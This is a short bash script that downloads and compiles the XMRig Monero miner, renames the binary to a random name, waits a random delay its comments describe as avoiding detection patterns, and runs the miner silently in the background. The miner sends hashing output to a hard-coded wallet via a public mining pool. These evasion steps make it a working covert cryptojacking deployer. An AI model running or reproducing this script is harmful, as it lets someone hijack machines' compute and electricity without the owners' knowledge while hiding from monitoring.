#!/bin/bash

### BASIC CONFIG ###
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
POOL="pool.supportxmr.com:443"
THREADS=12
RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"

### RANDOM DELAY TO AVOID DETECTION PATTERNS ###
DELAY=$((RANDOM % 180 + 60))  # 1 to 4 minutes
echo "[*] Sleeping $DELAY seconds..."
sleep $DELAY

### FUNCTION TO DOWNLOAD AND COMPILE XMRIG ###
setup_miner() {
    echo "[*] Installing dependencies..."
    sudo apt-get update -y >/dev/null 2>&1
    sudo apt-get install -y git cmake build-essential libssl-dev libhwloc-dev libuv1-dev >/dev/null 2>&1

    echo "[*] Cloning xmrig source..."
    git clone https://github.com/xmrig/xmrig.git >/dev/null 2>&1

    mkdir -p xmrig/build && cd xmrig/build
    echo "[*] Building miner..."
    cmake .. >/dev/null 2>&1
    make -j$(nproc) >/dev/null 2>&1

    cd ../..
    mv xmrig/build/xmrig ./$RAND_NAME
    chmod +x ./$RAND_NAME
}

### CHECK & INSTALL ###
if [ ! -f "./$RAND_NAME" ]; then
    setup_miner
fi

### RUN THE MINER IN BACKGROUND WITH ALIAS ###
echo "[*] Launching mining process..."
nohup ./$RAND_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls --donate-level 1 -t $THREADS >/dev/null 2>&1 &

echo "[+] Mining started under name '$RAND_NAME'."
